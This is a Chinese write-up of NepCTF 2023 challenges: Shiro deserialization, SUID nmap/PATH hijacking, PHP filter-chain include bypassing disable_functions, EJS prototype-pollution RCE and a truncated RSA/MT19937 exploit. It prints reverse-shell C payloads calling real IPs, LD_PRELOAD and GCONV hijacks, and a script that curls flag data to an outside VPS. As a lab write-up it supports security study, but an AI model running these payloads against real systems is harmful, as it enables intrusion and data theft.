# NepCTF2023


参考：

[NepCTF 2023 Web WriteUp | Boogiepop Doesn't Laugh (boogipop.com)](https://boogipop.com/2023/08/14/NepCTF%202023%20All%20WriteUP/)

[官方wp](https://nepnep-team.feishu.cn/wiki/SlmLwUflEisv6EkIkFYc9J4Ennh)

## web

### ez_java_checkin

存在shiro反序列化漏洞，爆破密钥和利用链

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152324.png)

flag只有写权限

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152325.png)

suid提权，读取/flag

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152326.png)

### 独步天下-转生成为镜花水月中的王者

suid提权

```bash
find / -perm -u=s -type f > /tmp/out.txt
```

找到nmap有suid权限，直接执行nmap -V会报错，显示sh找不到对应文件，但是在/bin下找到了

查看源文件发现是bash，靶机环境没有bash，改为sh

参考：https://blog.csdn.net/weixin_57543652/article/details/128640321

环境变量注入，把自己的目录放到环境最前面，优先执行自己指定目录下面的文件，相当于dll劫持一样

直接在ports-alive的第二行写入cat /flag即可，执行下面的命令就可以拿flag

```bash
#!/bin/sh
cat /flag

# 获取网段起始IP地址
get_start_ip() {
ip="$1"
subnet="$2"
IFS='.'
set -- $ip
oct1=$1
oct2=$2
oct3=$3
oct4=$4
start_oct4=$(( oct4 & subnet ))
echo "$oct1.$oct2.$oct3.$start_oct4"
}

# 获取网段结束IP地址
get_end_ip() {
ip="$1"
subnet="$2"
IFS='.'
set -- $ip
oct1=$1
oct2=$2
oct3=$3
oct4=$4
end_oct4=$(( (oct4 & subnet) | (255 - subnet) ))
echo "$oct1.$oct2.$oct3.$end_oct4"
}

# 将IPv4地址转换为长整型
ip2long() {
IFS='.'
set -- $1
echo $(( ($1<<24) + ($2<<16) + ($3<<8) + $4 ))
}

# 将长整型转换为IPv4地址
long2ip() {
echo $(($1>>24)).$(($1>>16&255)).$(($1>>8&255)).$(($1&255))
}


# 检查脚本是否以root身份运行
if [ "$(id -u)" != "0" ]; then
echo "此脚本需要以root权限运行"
exit 1
fi

# 检查是否提供目标主机或目标网段作为脚本参数
if [ $# -lt 3 ]; then
echo "请提供目标主机或目标网段、起始端口和结束端口作为脚本参数"
exit 1
fi

# 定义要扫描的目标主机或目标网段
target=$1
start_port=$2
end_port=$3

# 检查目标是主机还是网段
if echo "$target" | grep -q "/"; then
# 目标是网段
echo "扫描目标：$target"
target_ip=$(echo "$target" | cut -d '/' -f 1)
subnet=$(echo "$target" | cut -d '/' -f 2)
start_ip=$(get_start_ip "$target_ip" "$subnet")
end_ip=$(get_end_ip "$target_ip" "$subnet")
echo "起始IP地址：$start_ip"
echo "结束IP地址：$end_ip"

# 定义并行处理的最大并发数
max_processes=10

# 进行端口扫描和存活检测
seq "$(ip2long "$start_ip")" "$(ip2long "$end_ip")" | while read -r ip; do
{
current_ip=$(long2ip "$ip")
for port in $(seq "$start_port" "$end_port"); do
(nc -z -w 1 "$current_ip" "$port") >/tmp/tt 2>&1 && echo "IP地址 $current_ip 的端口 $port 是开放的"
done
} &
# 限制并行处理的数量
if [ $(jobs | wc -l) -ge "$max_processes" ]; then
wait
fi
done
wait

else
# 目标是单个主机
echo "扫描目标：$target"
target_ip=$target

# 进行端口扫描和存活检测
for port in $(seq "$start_port" "$end_port"); do
(nc -z -w 1 "$target_ip" "$port") >/tmp/tt 2>&1 && echo "IP地址 $target_ip 的端口 $port 是开放的"
done
fi
```

上传到靶机，`chmod`和`export`后执行`nmap -V`，得到flag

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152327.png)

非预期：

[NepCTF 2023 Web WriteUp | Boogiepop Doesn't Laugh (boogipop.com)](https://boogipop.com/2023/08/14/NepCTF%202023%20All%20WriteUP/#独步天下-转生成为镜花水月中的王者)

```bash
nmap "asd;sh"
```

### Ez_include

/jump.php?hint

```php
<?php
$jump_link = $_GET['link'];


if (isset($jump_link)) {

    include($jump_link. ".txt"); // More info? See "/var/www/html/hint.ini" or "./hint.ini"
    
}  else if (isset($_GET['hint'])) {
    
    highlight_file(__FILE__);
    
}


if (!isset($_GET['hint']) && !isset($jump_link)) {
?>
所以到底来没来? 且看 /<?php echo basename(__FILE__)?>?hint
<?php
}
?>
```

/hint.ini

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152328.png)

主要是绕过`disable_functions`和`open_basedir`

#### filter chain

参考：https://tttang.com/archive/1395/

利用`convert.iconv`编码转换构造马，问题是文件内容不能全为中文，需要提前处理一下

可以将filterchain base64编码；也可以对文本base64编码

工具：https://github.com/synacktiv/php_filter_chain_generator

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152329.png)

这里用的是`--rawbase64`（上面脚本`--chain`有问题），所以生成的chain最后还要`convert.base64-decode`

```bash
/jump.php?link=php://filter/convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/tmp/resources/4
/jump.php?link=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://filter//convert.base64-encode/resource=/tmp/resources/4

#post
0=phpinfo();
```

接下来要构造绕过`open_basedir`和`disable_functions`读取目录和文件

glob伪协议绕过`open_basedir`读取目录

```bash
/jump.php?link=php://filter/convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/tmp/resources/4

#post
0=$a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{echo($f->__toString().' ');
} exit(0);
?>
```

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152330.png)

小技巧：蚁剑的插件`bypass_disable_function`可查看哪些函数可用

iconv和putenv没禁用，这里可以考虑so文件命令执行，或者LD_PRELOAD

传文件可以使用ftp，或者xml，或者利用php上传配合php临时文件

#### 思路一 iconv

参考：https://blog.lxscloud.top/2022/04/15/PHP-Bypass-disable_function/

特点：iconv没禁

vps开一个ftp服务器，存放下面文件

evil.c

```python
#include <stdio.h>
#include <unistd.h>
#include <stdio.h>
__attribute__ ((__constructor__)) void angel (void){
    unsetenv("LD_PRELOAD");
    system("bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'");

}
```

编译生成 .so

```python
gcc evil.c -o evil.so -shared -fPIC
```

字符集 gconv-modules（其中evil对应evil.so

```python
module  evil//    INTERNAL    /tmp/evil    2
module  INTERNAL   evil//    /tmp/evil    2
```

evil.php（下载为.txt，方便后面包含触发

```python
<?php
putenv("GCONV_PATH=/tmp/");
iconv("evil", "UTF-8", "");
?>
```

ftp下载文件

```python
0=$local_file = "/tmp/evil.so";
$server_file = "evil.so";
$ftp_server = "ip";
$ftp_port = 21;
$ftp = ftp_connect($ftp_server, $ftp_port);
$login_result = ftp_login($ftp, "username", "password");
ftp_pasv($ftp, 1);
if (ftp_get($ftp, $local_file, $server_file, FTP_BINARY)){
    echo "Successfully written to $local_file\n";
} else {
    echo "Failed!\n";
}
ftp_close($ftp);
```

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152331.png)

包含evil.txt文件触发

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152332.png)

反弹shell，发现权限不够

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152333.png)

suid提权，发现 /showmsg

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152334.png)

同时还给了源码 /src.c

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152335.png)

cat没有指定路径，故可以环境提权

```python
echo -e '#!/bin/sh\ntail /flag' > /tmp/cat && chmod 755 /tmp/cat
export PATH=/tmp:$PATH
/showmsg
```

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152336.png)

#### 思路二 LD_PRELOAD劫持

参考：[LD_PRELOAD劫持（超详细篇）](https://blog.csdn.net/qq_63701832/article/details/129760495)

特点：putenv没禁

evil.c

```python
#include <stdio.h>
#include <unistd.h>
#include <stdio.h>
__attribute__ ((__constructor__)) void angel (void){
    unsetenv("LD_PRELOAD");
    system("bash -c 'bash -i >& /dev/tcp/119.29.207.27/3000 <&1'");

}
```

编译生成.so，ftp下载到/tmp/evil.so

同时需要一个函数触发系统函数，从而触发LD劫持，常见是`mail`和`error_log`，被禁了，这里`mb_send_mail`可代替

```python
#post
0=putenv("LD_PRELOAD=/tmp/evil.so");mb_send_mail("","","");
```

#### php上传配合临时文件触发LD劫持

一个name为0，表示post参数名

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152337.png)

### Post Crad For You

```javascript
var path = require('path');
const fs = require('fs');
const crypto = require("crypto");

const express = require('express')
const app = express()
const port = 3000

templateDir = path.join(__dirname, 'template');
app.set('view engine', 'ejs');
app.set('template', templateDir);

function sleep(milliSeconds){ 
	var StartTime =new Date().getTime(); 
	let i = 0;
	while (new Date().getTime() <StartTime+milliSeconds);

}

app.get('/', function(req, res) {
	return res.sendFile('./index.html', {root: __dirname});
});

app.get('/create', function(req, res) {
	let uuid;
	let name = req.query.name ?? '';
	let address = req.query.address ?? '';
	let message = req.query.message ?? '';
	do {
		uuid = crypto.randomUUID();
	} while (fs.existsSync(`${templateDir}/${uuid}.ejs`))

	try {
		if (name != '' && address != '' && message != '') {
			let source = ["source", "source1", "source2", "source3"].sort(function(){
				return 0.5 - Math.random();
			})
			fs.readFile(source[0]+".html", 'utf8',function(err, pageContent){
				fs.writeFileSync(`${templateDir}/${uuid}.ejs`, pageContent.replace(/--ID--/g, uuid.replace(/-/g, "")));
				sleep(2000);
			})
		} else {
			res.status(500).send("Params `name` or `address` or `message` empty");
			return;
		}
	} catch(err) {
		res.status(500).send("Failed to write file");
		return;
	}

	return res.redirect(`/page?pageid=${uuid}&name=${name}&address=${address}&message=${message}`);
});

app.get('/page', (req,res) => {
	let id = req.query.pageid
	if (!/^[0-9A-F]{8}-[0-9A-F]{4}-[4][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i.test(id) || !fs.existsSync(`${templateDir}/${id}.ejs`)) {
		res.status(404).send("Sorry, no such id")
			return;
			}
			res.render(`${templateDir}/${id}.ejs`, req.query);
			})

			app.listen(port, () => {
			console.log(`App listening on port ${port}`)
			})
```

`res.render(`${templateDir}/${id}.ejs`, req.query);`ejs模板 原型链污染

参考：

https://blog.huli.tw/2023/06/22/ejs-render-vulnerability-ctf/

https://blog.csdn.net/qq_61768489/article/details/129503772

ejs-render-rce

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152338.png)

```json
settings: {
  'view options': {
    client: true,
    escape: 'function(){return process.mainModule.require('child_process').execSync('id')}'
  }
}
import requests

url = 'http://nepctf.1cepeak.cn:32051'

params={
    "name":"test",
    "address":"test",
    "message":"test"
}
res = requests.get(url+"/create",params=params,allow_redirects=False)
path=res.headers['location']

# cmd = "ls /"
cmd = "cat /flag"
# 外带到vps
payload="&settings[view options][escape]=function(){return process.mainModule.require('child_process').execSync('curl http://119.29.207.27:3000/`"+cmd+"|base64`')}&font=aaa&fontSize=aaa&settings[view options][client]=true"
res2=requests.get(url=url+path+payload)
```

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152339.png)

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101152340.png)

## Crypto（看

https://nepnep-team.feishu.cn/wiki/SlmLwUflEisv6EkIkFYc9J4Ennh#JlCRduVFZokuafx9bIic2eken5e

### random_RSA

考点：维纳攻击，MT19937攻击，

RSA_random.py

```c
from gmpy2 import next_prime, invert as inverse_mod
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA
from random import getrandbits
from math import lcm
from sys import exit

global_bits = 1024

BANNER = rb"""
.--------.--------.--------.--------.--------.--------.--------.--------.--------.--------.--------.
| N.--.  | E.--.  | P.--.  | C.--.  | T.--.  | F.--.  | H.--.  | A.--.  | P.--.  | P.--.  | Y.--.  |
|  :/\:  |  (\/)  |  :():  |  :/\:  |  :/\:  |  :/\:  |  (\/)  |  :():  |  :/\:  |  :/\:  |  (\/)  |
|  :\/:  |  :\/:  |  ()()  |  (__)  |  :\/:  |  (__)  |  :\/:  |  ()()  |  :\/:  |  :\/:  |  :\/:  |
|  '--'n |  '--'e |  '--'p |  '--'c | '--'t  |  '--'f |  '--'h |  '--'a |  '--'p |  '--'p |  '--'y |
`--------`--------`--------`--------'--------`--------`--------`--------`--------`--------`--------`
"""


def generate_prime(bits: int):
    p = (getrandbits(bits - 32) << 32)
    return next_prime(p)


def generate_private_key(bits: int):
    p, q = generate_prime(bits), generate_prime(bits)
    n, phi = p * q, lcm(p-1, q - 1)

    d = inverse_mod(0x10001, phi)
    privateKey = RSA.construct((int(n), int(0x10001), int(d), int(p), int(q)))
    return privateKey, p > q


if __name__ == "__main__":
    print(BANNER.decode())
    print("Welcome to the world of random RSA.")
    print("Please make your choice.")
    for _ in range(8):
        choice = input()

        if choice == '1':
            p, q = generate_prime(global_bits), generate_prime(global_bits)
            N = p*q
            d = generate_prime(global_bits-32)
            e = inverse_mod(d, (p * p - 1) * (q * q - 1))
            print(f"{int(N)}")
            print(f"{int(e)}")

        elif choice == '2':
            privateKey, signal = generate_private_key(global_bits)
            Cipher = PKCS1_v1_5.new(privateKey)
            c = (Cipher.encrypt(flag.encode()))
            print(c)
            exit()

        else:
            exit()
```

七次获取随机数，最后一次推算密钥

大致过程：

- 根据N和e，通过维纳攻击得到d [RSA之初学维纳攻击](https://blog.csdn.net/rreally/article/details/111092579)
- 求解p和q
- 随机数预测 [浅析MT19937伪随机数生成算法](https://www.anquanke.com/post/id/205861)

exp.py

```python
from random import getrandbits, random, randint
import gmpy2
from gmpy2 import iroot
from gmpy2 import mpz
import random
from Crypto.Cipher import PKCS1_v1_5
from gmpy2 import next_prime, lcm,invert as inverse_mod
from Crypto.Util.number import *
from Crypto.PublicKey import RSA

# # 读取数据N和e
# f = open("out.txt", 'r')
# N = []
# e = []
# for i in range(7):
